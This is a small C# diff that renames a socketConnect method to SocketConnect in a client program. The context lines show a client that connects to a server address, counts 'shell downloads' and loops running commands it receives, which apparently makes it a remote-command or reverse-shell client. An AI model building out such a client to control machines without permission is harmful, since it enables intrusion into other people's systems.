@@ -13,7 +13,7 @@ namespace Client
         static Socket sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         static int shelldownloadCount = 0;
 
-        static void socketConnect()
+        static void SocketConnect()
         {
             
             IPEndPoint connectAddress = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8000); // Server IP & PORT 
@@ -102,7 +102,7 @@ namespace Client
                 bool socketDEAD = false;
                 try
                 {
-                    socketConnect();
+                    SocketConnect();
                     while (socketDEAD != true)
                     {
                         socketDEAD = ExecuteCommand();
